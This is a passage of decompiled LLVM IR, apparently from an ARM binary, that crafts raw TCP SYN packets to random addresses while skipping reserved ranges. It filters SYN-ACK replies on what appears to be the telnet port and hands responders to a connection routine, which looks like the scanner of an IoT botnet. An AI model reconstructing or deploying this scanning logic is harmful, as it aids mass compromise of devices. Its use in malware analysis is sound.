dec_label_pc_100cc:                               ; preds = %bb1910
  store i1 %v2_e944, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ef74, label %dec_label_pc_e858, label %dec_label_pc_100d4

dec_label_pc_100d4:                               ; preds = %.thread639, %dec_label_pc_100cc, %bb1910
  %v7_100d4 = icmp eq i32 %v1_e85c, 86
  %.2043 = zext i1 %v7_100d4 to i32
  store i32 %.2043, i32* %r3.global-to-local, align 4
  %v2_100e0 = icmp ugt i32 %v1_e870, 207
  store i1 %v2_100e0, i1* %cpsr_c.global-to-local, align 1
  %v7_100e0 = icmp eq i32 %v1_e870, 208
  store i1 %v7_100e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100e0, label %bb1913, label %dec_label_pc_100ec

bb1913:                                           ; preds = %dec_label_pc_100d4
  %v2_100d4 = icmp ugt i32 %v1_e85c, 85
  store i1 %v2_100d4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_100d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100d4, label %dec_label_pc_e858, label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %dec_label_pc_100d4, %bb1913
  %v2_100ec = and i32 %.2043, %.2031
  %v4_100ec = icmp eq i32 %v2_100ec, 0
  store i1 %v4_100ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_100ec, label %dec_label_pc_100f4, label %dec_label_pc_e858

dec_label_pc_100f4:                               ; preds = %dec_label_pc_100ec
  %v2_100f4 = icmp ugt i32 %v1_e85c, 192
  store i1 %v2_100f4, i1* %cpsr_c.global-to-local, align 1
  %v7_100f4 = icmp eq i32 %v1_e85c, 193
  store i1 %v7_100f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100f4, label %bb1914, label %dec_label_pc_10100

bb1914:                                           ; preds = %dec_label_pc_100f4
  store i1 %v2_ef88, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ef88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef88, label %dec_label_pc_e858, label %dec_label_pc_10100

dec_label_pc_10100:                               ; preds = %dec_label_pc_100f4, %bb1914
  store i32 %v1_efc4, i32* %r3.global-to-local, align 4
  %v2_10104 = icmp ugt i32 %v1_e85c, 119
  store i1 %v2_10104, i1* %cpsr_c.global-to-local, align 1
  %v7_10104 = icmp eq i32 %v1_e85c, 120
  store i1 %v7_10104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10104, label %.thread645, label %.thread646

.thread646:                                       ; preds = %dec_label_pc_10100
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10120

.thread645:                                       ; preds = %dec_label_pc_10100
  %v2_1010c = urem i32 %v1_efc4, 2
  store i32 %v2_1010c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10110 = icmp eq i32 %v2_1010c, 0
  store i1 %v2_10110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10110, label %dec_label_pc_10120, label %dec_label_pc_10118

dec_label_pc_10118:                               ; preds = %.thread645
  %v2_10118 = icmp ugt i32 %v1_e870, 106
  store i1 %v2_10118, i1* %cpsr_c.global-to-local, align 1
  %v7_10118 = icmp eq i32 %v1_e870, 107
  store i1 %v7_10118, i1* %cpsr_z.global-to-local, align 1
  %v2_1011c = xor i1 %v2_10118, true
  %v3_1011c = or i1 %v7_10118, %v2_1011c
  br i1 %v3_1011c, label %dec_label_pc_e858, label %dec_label_pc_10120

dec_label_pc_10120:                               ; preds = %.thread646, %dec_label_pc_10118, %.thread645
  store i32 %.1992, i32* %r3.global-to-local, align 4
  store i32 %.2018, i32* %r4.global-to-local, align 4
  %v2_10128 = and i32 %.1992, %.2018
  %v4_10128 = icmp eq i32 %v2_10128, 0
  store i1 %v4_10128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_10128, label %dec_label_pc_10130, label %dec_label_pc_e858

dec_label_pc_10130:                               ; preds = %dec_label_pc_10120
  %v2_10130 = icmp ugt i32 %v1_e85c, 77
  store i1 %v2_10130, i1* %cpsr_c.global-to-local, align 1
  %v7_10130 = icmp eq i32 %v1_e85c, 78
  store i1 %v7_10130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10130, label %bb1915, label %dec_label_pc_10144

bb1915:                                           ; preds = %dec_label_pc_10130
  %v3_10134 = icmp ugt i32 %v1_e870, 45
  store i1 %v3_10134, i1* %cpsr_c.global-to-local, align 1
  %v8_10134 = icmp eq i32 %v1_e870, 46
  store i1 %v8_10134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10134, label %.thread651.thread, label %dec_label_pc_10144

.thread651.thread:                                ; preds = %bb1915
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e858

dec_label_pc_10144:                               ; preds = %bb1915, %dec_label_pc_10130
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10144 = icmp ugt i32 %v1_e85c, 223
  store i1 %v2_10144, i1* %cpsr_c.global-to-local, align 1
  %v7_10144 = icmp eq i32 %v1_e85c, 224
  store i1 %v7_10144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10144, label %dec_label_pc_e858, label %dec_label_pc_1014c

dec_label_pc_1014c:                               ; preds = %dec_label_pc_10144
  %v5_10158 = call i32 @llvm.bswap.i32(i32 %v0_e858)
  store i32 %v5_10158, i32* %r3.global-to-local, align 4
  %v3_10160 = udiv i32 %v5_10158, 16777216
  %v1_10164 = and i32 %v5_10158, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v1_1015c = udiv i32 %v5_10158, 256
  %v4_10168 = and i32 %v1_1015c, 65280
  %v4_1016c = mul i32 %v1_10164, 256
  store i32 ptrtoint (i8** @global_var_23250.151 to i32), i32* @r0, align 4
  %tmp2188 = and i32 %v0_e858, 65536
  %v3_10174 = icmp ne i32 %tmp2188, 0
  store i1 %v3_10174, i1* %cpsr_c.global-to-local, align 1
  %v4_10174 = mul nuw i32 %v3_e878, 16777216
  %v5_10168 = or i32 %v3_10160, %v4_10174
  %v5_1016c = or i32 %v5_10168, %v4_10168
  %v5_10174 = or i32 %v5_1016c, %v4_1016c
  store i32 %v5_10174, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_10174, i32* @global_var_23260.212, align 4
  store i16 0, i16* bitcast (i32* @global_var_2325a.213 to i16*), align 4
  %v3_10184 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_23250.151 to i32), i32 20)
  %v4_10184 = trunc i32 %v3_10184 to i16
  %v3_10190 = load i32, i32* @global_var_23260.212, align 4
  store i32 %v3_10190, i32* %ip.global-to-local, align 4
  store i16 %v4_10184, i16* bitcast (i32* @global_var_2325a.213 to i16*), align 4
  %v0_10198 = load i32, i32* %r4.global-to-local, align 4
  %v1_10198 = trunc i32 %v0_10198 to i16
  store i16 %v1_10198, i16* bitcast (i32* @global_var_23274.215 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_23264.154 to i32), i32* @r1, align 4
  store i32 %v3_10190, i32* @global_var_23268.216, align 4
  store i16 5888, i16* @global_var_23266.159, align 2
  store i32 ptrtoint (i8** @global_var_23250.151 to i32), i32* %r0.global-to-local, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_101b8 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_23250.151 to i32), i32 ptrtoint (i32* @global_var_23264.154 to i32), i32 5120, i32 20)
  %v6_101b8 = trunc i32 %v5_101b8 to i16
  %v2_101c8 = load i32, i32* @global_var_25d68.149, align 4
  store i16 %v6_101b8, i16* bitcast (i32* @global_var_23274.215 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_23250.151 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_11158, i32* @r4, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_101f0 = load i16, i16* @global_var_23266.159, align 2
  %v4_101f0 = zext i16 %v3_101f0 to i32
  store i32 %v4_101f0, i32* %ip.global-to-local, align 4
  store i32 %v2_101c8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_11220, i32* @lr, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_10214 = call i32 @__libc_sendto(i32 %v2_101c8, i32 ptrtoint (i8** @global_var_23250.151 to i32), i32 40, i32 16384, i32 %v2_11220, i32 16)
  store i32 %v7_10214, i32* %r0.global-to-local, align 4
  %v3_10218 = load i32, i32* %stack_var_-52, align 4
  %v1_1021c = add i32 %v3_10218, 1
  store i32 %v1_1021c, i32* %r3.global-to-local, align 4
  %v3_10220 = icmp ugt i32 %v1_1021c, 383
  store i1 %v3_10220, i1* %cpsr_c.global-to-local, align 1
  %v8_10220 = icmp eq i32 %v1_1021c, 384
  store i1 %v8_10220, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_1021c, i32* %stack_var_-52, align 4
  %v5_10228 = icmp slt i32 %v1_1021c, 384
  br i1 %v5_10228, label %dec_label_pc_e82c, label %dec_label_pc_1022c

dec_label_pc_1022c:                               ; preds = %dec_label_pc_1014c
  store i32 %v2_e814, i32* @fp, align 4
  br label %dec_label_pc_10230

dec_label_pc_10230:                               ; preds = %dec_label_pc_e810, %dec_label_pc_1022c
  %v0_10230 = call i32 @__GI___errno_location()
  store i32 %v0_10230, i32* @sb, align 4
  store i32 %v2_e808, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_10240, i32* @r4, align 4
  br label %dec_label_pc_10244

dec_label_pc_10244:                               ; preds = %dec_label_pc_102f4, %dec_label_pc_102ec, %dec_label_pc_102e4, %dec_label_pc_102c0, %dec_label_pc_102b4, %dec_label_pc_102a4, %dec_label_pc_1028c, %dec_label_pc_102dc, %dec_label_pc_102d0, %dec_label_pc_10284, %dec_label_pc_103a8, %dec_label_pc_10230
  %v1_10248 = phi i32 [ %v0_10230, %dec_label_pc_10230 ], [ %v1_10248.pre.pre, %dec_label_pc_103a8 ], [ %v0_10278, %dec_label_pc_10284 ], [ %v0_10278, %dec_label_pc_102d0 ], [ %v0_10278, %dec_label_pc_102dc ], [ %v0_10278, %dec_label_pc_1028c ], [ %v0_10278, %dec_label_pc_102a4 ], [ %v0_10278, %dec_label_pc_102b4 ], [ %v0_10278, %dec_label_pc_102c0 ], [ %v0_10278, %dec_label_pc_102e4 ], [ %v0_10278, %dec_label_pc_102ec ], [ %v0_10278, %dec_label_pc_102f4 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_10248 = inttoptr i32 %v1_10248 to i32*
  store i32 0, i32* %v2_10248, align 4
  %v2_10254 = load i32, i32* @global_var_25d68.149, align 4
  store i32 %v2_10254, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e808, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10264 = load i32, i32* %ip.global-to-local, align 4
  %v6_1026c = call i32 @__libc_recvfrom(i32 %v2_10254, i32 %v2_e808, i32 1514, i32 16384, i32 %v0_10264, i32 %v0_10264)
  store i32 %v6_1026c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10270 = icmp eq i32 %v6_1026c, 0
  store i1 %v2_10270, i1* %cpsr_z.global-to-local, align 1
  %tmp1917 = icmp slt i32 %v6_1026c, 1
  br i1 %tmp1917, label %dec_label_pc_103e8, label %dec_label_pc_10278

dec_label_pc_10278:                               ; preds = %dec_label_pc_10244
  %v0_10278 = load i32, i32* @sb, align 4
  %v1_10278 = inttoptr i32 %v0_10278 to i32*
  %v2_10278 = load i32, i32* %v1_10278, align 4
  store i32 %v2_10278, i32* %r3.global-to-local, align 4
  %v2_1027c = icmp ugt i32 %v2_10278, 10
  store i1 %v2_1027c, i1* %cpsr_c.global-to-local, align 1
  %v7_1027c = icmp eq i32 %v2_10278, 11
  store i1 %v7_1027c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1027c, label %dec_label_pc_103e8, label %dec_label_pc_10284

dec_label_pc_10284:                               ; preds = %dec_label_pc_10278
  %v2_10284 = icmp ugt i32 %v6_1026c, 38
  store i1 %v2_10284, i1* %cpsr_c.global-to-local, align 1
  %v7_10284 = icmp eq i32 %v6_1026c, 39
  store i1 %v7_10284, i1* %cpsr_z.global-to-local, align 1
  %v2_10288 = xor i1 %v2_10284, true
  %v3_10288 = or i1 %v7_10284, %v2_10288
  br i1 %v3_10288, label %dec_label_pc_10244, label %dec_label_pc_1028c

dec_label_pc_1028c:                               ; preds = %dec_label_pc_10284
  store i32 %v2_e808, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %ip.global-to-local, align 4
  %v3_10294 = load i32, i32* %v2_10294, align 4
  store i32 %v3_10294, i32* %r2.global-to-local, align 4
  %v2_10298 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_10298, i32* %r3.global-to-local, align 4
  %v3_1029c = icmp uge i32 %v3_10294, %v2_10298
  store i1 %v3_1029c, i1* %cpsr_c.global-to-local, align 1
  %v9_1029c = icmp eq i32 %v3_10294, %v2_10298
  store i1 %v9_1029c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1029c, label %dec_label_pc_102a4, label %dec_label_pc_10244

dec_label_pc_102a4:                               ; preds = %dec_label_pc_1028c
  store i32 %v2_e808, i32* @lr, align 4
  %v3_102a8 = load i8, i8* %v2_102a8, align 1
  %v4_102a8 = zext i8 %v3_102a8 to i32
  store i32 %v4_102a8, i32* %r3.global-to-local, align 4
  %v2_102ac = icmp ugt i8 %v3_102a8, 5
  store i1 %v2_102ac, i1* %cpsr_c.global-to-local, align 1
  %v7_102ac = icmp eq i8 %v3_102a8, 6
  store i1 %v7_102ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102ac, label %dec_label_pc_102b4, label %dec_label_pc_10244

dec_label_pc_102b4:                               ; preds = %dec_label_pc_102a4
  %v0_102b4 = load i32, i32* @r4, align 4
  %v1_102b4 = inttoptr i32 %v0_102b4 to i16*
  %v2_102b4 = load i16, i16* %v1_102b4, align 2
  %v3_102b4 = zext i16 %v2_102b4 to i32
  store i32 %v3_102b4, i32* %r3.global-to-local, align 4
  %v2_102b8 = icmp ugt i16 %v2_102b4, 5887
  store i1 %v2_102b8, i1* %cpsr_c.global-to-local, align 1
  %v7_102b8 = icmp eq i16 %v2_102b4, 5888
  store i1 %v7_102b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102b8, label %dec_label_pc_102c0, label %dec_label_pc_10244

dec_label_pc_102c0:                               ; preds = %dec_label_pc_102b4
  %v1_102c0 = add i32 %v0_102b4, 2
  %v2_102c0 = inttoptr i32 %v1_102c0 to i16*
  %v3_102c0 = load i16, i16* %v2_102c0, align 2
  %v4_102c0 = zext i16 %v3_102c0 to i32
  store i32 %v4_102c0, i32* %r3.global-to-local, align 4
  store i32 %v4_e640, i32* %r0.global-to-local, align 4
  %v3_102c8 = icmp uge i32 %v4_102c0, %v4_e640
  store i1 %v3_102c8, i1* %cpsr_c.global-to-local, align 1
  %v9_102c8 = icmp eq i32 %v4_102c0, %v4_e640
  store i1 %v9_102c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_102c8, label %dec_label_pc_102d0, label %dec_label_pc_10244

dec_label_pc_102d0:                               ; preds = %dec_label_pc_102c0
  %v1_102d0 = add i32 %v0_102b4, 13
  %v2_102d0 = inttoptr i32 %v1_102d0 to i8*
  %v3_102d0 = load i8, i8* %v2_102d0, align 1
  %v4_102d0 = zext i8 %v3_102d0 to i32
  store i32 %v4_102d0, i32* %r3.global-to-local, align 4
  %v1_102d4 = and i32 %v4_102d0, 2
  %v2_102d4 = icmp eq i32 %v1_102d4, 0
  store i1 %v2_102d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_102d4, label %dec_label_pc_10244, label %dec_label_pc_102dc

dec_label_pc_102dc:                               ; preds = %dec_label_pc_102d0
  %v1_102dc = and i32 %v4_102d0, 16
  %v2_102dc = icmp eq i32 %v1_102dc, 0
  store i1 %v2_102dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_102dc, label %dec_label_pc_10244, label %dec_label_pc_102e4

dec_label_pc_102e4:                               ; preds = %dec_label_pc_102dc
  %v1_102e4 = and i32 %v4_102d0, 4
  %v2_102e4 = icmp eq i32 %v1_102e4, 0
  store i1 %v2_102e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_102e4, label %dec_label_pc_102ec, label %dec_label_pc_10244

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102e4
  %tmp2189 = urem i8 %v3_102d0, 2
  %v2_102ec = icmp eq i8 %tmp2189, 0
  store i1 %v2_102ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_102ec, label %dec_label_pc_102f4, label %dec_label_pc_10244

dec_label_pc_102f4:                               ; preds = %dec_label_pc_102ec
  %v1_102f4 = add i32 %v0_102b4, 8
  %v2_102f4 = inttoptr i32 %v1_102f4 to i32*
  %v3_102f4 = load i32, i32* %v2_102f4, align 4
  %v3_102fc = udiv i32 %v3_102f4, 16777216
  %v1_10300 = and i32 %v3_102f4, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v1_102f8 = udiv i32 %v3_102f4, 256
  %v4_10304 = and i32 %v1_102f8, 65280
  %v4_10308 = mul i32 %v1_10300, 256
  %v4_1030c = mul i32 %v3_102f4, 16777216
  %v5_10304 = or i32 %v4_1030c, %v3_102fc
  %v5_10308 = or i32 %v5_10304, %v4_10304
  %v5_1030c = or i32 %v5_10308, %v4_10308
  %v1_10310 = add i32 %v5_1030c, -1
  store i32 %v1_10310, i32* %r2.global-to-local, align 4
  %v1_10314 = and i32 %v1_10310, 16711680
  store i32 %v1_10314, i32* %r0.global-to-local, align 4
  %v3_10318 = udiv i32 %v1_10310, 16777216
  %v4_1031c = udiv i32 %v1_10314, 256
  %v5_1031c = or i32 %v4_1031c, %v3_10318
  %v1_10320 = and i32 %v1_10310, 65280
  store i32 %v1_10320, i32* %r1.global-to-local, align 4
  %v4_10324 = mul nuw nsw i32 %v1_10320, 256
  %v5_10324 = or i32 %v5_1031c, %v4_10324
  store i32 %v5_10324, i32* %r3.global-to-local, align 4
  %v3_10328 = load i32, i32* %v2_10328, align 4
  store i32 %v3_10328, i32* %ip.global-to-local, align 4
  %v5_1032c = call i32 @llvm.bswap.i32(i32 %v1_10310)
  store i32 %v5_1032c, i32* %r3.global-to-local, align 4
  %v3_10330 = icmp uge i32 %v5_1032c, %v3_10328
  store i1 %v3_10330, i1* %cpsr_c.global-to-local, align 1
  %v9_10330 = icmp eq i32 %v5_1032c, %v3_10328
  store i1 %v9_10330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10330, label %dec_label_pc_10338, label %dec_label_pc_10244

dec_label_pc_10338:                               ; preds = %dec_label_pc_102f4
  %v0_10338 = load i32, i32* @r5, align 4
  %v2_10338 = icmp ugt i32 %v0_10338, 254
  store i1 %v2_10338, i1* %cpsr_c.global-to-local, align 1
  %v7_10338 = icmp eq i32 %v0_10338, 255
  store i1 %v7_10338, i1* %cpsr_z.global-to-local, align 1
  %v8_1033c = icmp sgt i32 %v0_10338, 255
  br i1 %v8_1033c, label %dec_label_pc_103e8, label %dec_label_pc_10340

dec_label_pc_10340:                               ; preds = %dec_label_pc_10338
  %v2_10348 = load i32, i32* @global_var_25d64.147, align 4
  store i32 %v2_10348, i32* %r1.global-to-local, align 4
  %v3_1034c = mul i32 %v0_10338, 256
  store i32 %v3_1034c, i32* %r2.global-to-local, align 4
  %v2_10350 = mul i32 %v0_10338, 288
  store i32 %v2_10350, i32* %r3.global-to-local, align 4
  %v2_10354 = add i32 %v2_10348, %v2_10350
  store i32 %v2_10354, i32* @r0, align 4
  %v1_10358 = add i32 %v2_10354, 12
  %v2_10358 = inttoptr i32 %v1_10358 to i32*
  %v3_10358 = load i32, i32* %v2_10358, align 4
  store i32 %v3_10358, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1035c = icmp eq i32 %v3_10358, 0
  store i1 %v2_1035c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1035c, label %dec_label_pc_103a0, label %dec_label_pc_1037c.preheader

dec_label_pc_1037c.preheader:                     ; preds = %dec_label_pc_10340
  %v2_10360 = add i32 %v0_10338, 1
  %v2_10368 = and i32 %v2_10360, 134217728
  %v3_10368 = icmp ne i32 %v2_10368, 0
  store i1 %v3_10368, i1* %cpsr_c.global-to-local, align 1
  %v3_1036c = mul i32 %v2_10360, 288
  store i32 %v3_1036c, i32* %r3.global-to-local, align 4
  %v3_10370 = add i32 %v2_10348, %v3_1036c
  store i32 %v3_10370, i32* %r1.global-to-local, align 4
  store i32 %v0_10338, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1037c

dec_label_pc_1037c:                               ; preds = %dec_label_pc_1037c.preheader, %dec_label_pc_10390
  %v0_10390 = phi i32 [ %v3_10370, %dec_label_pc_1037c.preheader ], [ %v1_10388, %dec_label_pc_10390 ]
  %v0_1037c = phi i32 [ %v0_10338, %dec_label_pc_1037c.preheader ], [ %v1_1037c, %dec_label_pc_10390 ]
  %v1_1037c = add i32 %v0_1037c, 1
  store i32 %v1_1037c, i32* %r2.global-to-local, align 4
  %v7_10380 = icmp eq i32 %v1_1037c, 256
  store i32 %v0_10390, i32* @r0, align 4
  %v1_10388 = add i32 %v0_10390, 288
  store i32 %v1_10388, i32* %r1.global-to-local, align 4
  br i1 %v7_10380, label %dec_label_pc_103e8.loopexit, label %dec_label_pc_10390

dec_label_pc_10390:                               ; preds = %dec_label_pc_1037c
  %v1_10390 = add i32 %v0_10390, 12
  %v2_10390 = inttoptr i32 %v1_10390 to i32*
  %v3_10390 = load i32, i32* %v2_10390, align 4
  store i32 %v3_10390, i32* %r3.global-to-local, align 4
  %v2_10394 = icmp eq i32 %v3_10390, 0
  br i1 %v2_10394, label %dec_label_pc_1039c, label %dec_label_pc_1037c

dec_label_pc_1039c:                               ; preds = %dec_label_pc_10390
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_1037c, i32* @r5, align 4
  br label %dec_label_pc_103a0

dec_label_pc_103a0:                               ; preds = %dec_label_pc_10340, %dec_label_pc_1039c
  %v1_103ac = phi i32 [ %v2_10354, %dec_label_pc_10340 ], [ %v0_10390, %dec_label_pc_1039c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_103a0 = icmp eq i32 %v1_103ac, 0
  store i1 %v2_103a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_103a0, label %dec_label_pc_103e8, label %dec_label_pc_103a8

dec_label_pc_103a8:                               ; preds = %dec_label_pc_103a0
  store i32 5888, i32* %r3.global-to-local, align 4
  %v2_103ac = add i32 %v1_103ac, 16
  %v3_103ac = inttoptr i32 %v2_103ac to i32*
  store i32 %v3_10328, i32* %v3_103ac, align 4
  %v0_103b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_103b0 = trunc i32 %v0_103b0 to i16
  %v2_103b0 = load i32, i32* @r0, align 4
  %v3_103b0 = add i32 %v2_103b0, 20
  %v4_103b0 = inttoptr i32 %v3_103b0 to i16*
  store i16 %v1_103b0, i16* %v4_103b0, align 2
  %v0_103b4 = call i32 @setup_connection()
  store i32 %v0_103b4, i32* %r0.global-to-local, align 4
  %v1_10248.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_10244

dec_label_pc_103bc:                               ; preds = %dec_label_pc_e550
  %v2_103bc = load i32, i32* @global_var_25d68.149, align 4
  store i32 %v2_103bc, i32* %r0.global-to-local, align 4
  %v1_103c0 = call i32 @__GI___libc_close(i32 %v2_103bc)
  store i32 %v1_103c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e5b8

dec_label_pc_103c8:                               ; preds = %thread-pre-split603.thread, %thread-pre-split603
  %v2_103c8 = icmp ugt i32 %v1_e85c, 78
  store i1 %v2_103c8, i1* %cpsr_c.global-to-local, align 1
  %v7_103c8 = icmp eq i32 %v1_e85c, 79
  store i1 %v7_103c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103c8, label %bb1918, label %dec_label_pc_ffac

bb1918:                                           ; preds = %dec_label_pc_103c8
  %v3_103cc = icmp ugt i32 %v1_e870, 120
  store i1 %v3_103cc, i1* %cpsr_c.global-to-local, align 1
  %v8_103cc = icmp eq i32 %v1_e870, 121
  store i1 %v8_103cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_103cc, label %dec_label_pc_103d4, label %dec_label_pc_ffac

dec_label_pc_103d4:                               ; preds = %bb1918
  %v1_103d4 = add nsw i32 %v1_e874, -255
  store i32 %v1_103d4, i32* %r3.global-to-local, align 4
  %v2_103d4 = icmp eq i32 %v1_e874, 255
  store i1 %v2_103d4, i1* %cpsr_c.global-to-local, align 1
  %v7_103d4 = icmp eq i32 %v1_e874, 255
  store i1 %v7_103d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103d4, label %bb1920, label %bb1919

bb1919:                                           ; preds = %dec_label_pc_103d4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1920

bb1920:                                           ; preds = %dec_label_pc_103d4, %bb1919
  %v0_103dc = phi i32 [ %v1_103d4, %dec_label_pc_103d4 ], [ 1, %bb1919 ]
  %v2_103dc = and i32 %v3_e864, 64
  %v3_103dc = icmp ne i32 %v2_103dc, 0
  store i1 %v3_103dc, i1* %cpsr_c.global-to-local, align 1
  %v4_103dc = udiv i32 %v1_e874, 128
  %v5_103dc = and i32 %v0_103dc, %v4_103dc
  store i32 %v5_103dc, i32* %r3.global-to-local, align 4
  %v6_103dc = icmp eq i32 %v5_103dc, 0
  store i1 %v6_103dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_103dc, label %dec_label_pc_ffac, label %dec_label_pc_e858

dec_label_pc_103e8.loopexit:                      ; preds = %dec_label_pc_1037c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_103e8

dec_label_pc_103e8:                               ; preds = %dec_label_pc_103a0, %dec_label_pc_10338, %dec_label_pc_10278, %dec_label_pc_10244, %dec_label_pc_103e8.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1852, i32* %r4.global-to-local, align 4
  %v2_104082112 = load i32, i32* @sp, align 4
  %v3_104082113 = add i32 %v2_104082112, 1852
  %v4_104082114 = inttoptr i32 %v3_104082113 to i32*
  store i32 0, i32* %v4_104082114, align 4
  br label %dec_label_pc_103f4.dec_label_pc_103f4_crit_edge

dec_label_pc_103f4.dec_label_pc_103f4_crit_edge:  ; preds = %dec_label_pc_103e8, %dec_label_pc_103f4.dec_label_pc_103f4_crit_edge
  %v0_103f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_103f8 = add i32 %v0_103f4.pre, 4
  store i32 %v1_103f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10400 = add i32 %v0_103f4.pre, 1848
  store i32 %v1_10400, i32* %r4.global-to-local, align 4
  %v7_10404 = icmp eq i32 %v1_103f8, 128
  %v2_10408 = load i32, i32* @sp, align 4
  %v3_10408 = add i32 %v2_10408, %v1_10400
  %v4_10408 = inttoptr i32 %v3_10408 to i32*
  store i32 0, i32* %v4_10408, align 4
  br i1 %v7_10404, label %dec_label_pc_10410, label %dec_label_pc_103f4.dec_label_pc_103f4_crit_edge

dec_label_pc_10410:                               ; preds = %dec_label_pc_103f4.dec_label_pc_103f4_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10410 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10410, i32* %stack_var_-352, align 4
  %v1_1041c2115 = add i32 %v0_10410, 8
  store i32 %v1_1041c2115, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_104242116 = add i32 %v0_10410, 1724
  store i32 %v1_104242116, i32* %ip.global-to-local, align 4
  %v7_104282117 = icmp eq i32 %v1_1041c2115, 128
  %v2_1042c2118 = load i32, i32* @sp, align 4
  %v3_1042c2119 = add i32 %v2_1042c2118, %v1_104242116
  %v4_1042c2120 = inttoptr i32 %v3_1042c2119 to i32*
  store i32 0, i32* %v4_1042c2120, align 4
  br i1 %v7_104282117, label %dec_label_pc_10434, label %dec_label_pc_10418.dec_label_pc_10418_crit_edge

dec_label_pc_10418.dec_label_pc_10418_crit_edge:  ; preds = %dec_label_pc_10410, %dec_label_pc_10418.dec_label_pc_10418_crit_edge
  %v0_10418.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1041c = add i32 %v0_10418.pre, 4
  store i32 %v1_1041c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_10424 = add i32 %v0_10418.pre, 1720
  store i32 %v1_10424, i32* %ip.global-to-local, align 4
  %v7_10428 = icmp eq i32 %v1_1041c, 128
  %v2_1042c = load i32, i32* @sp, align 4
  %v3_1042c = add i32 %v2_1042c, %v1_10424
  %v4_1042c = inttoptr i32 %v3_1042c to i32*
  store i32 0, i32* %v4_1042c, align 4
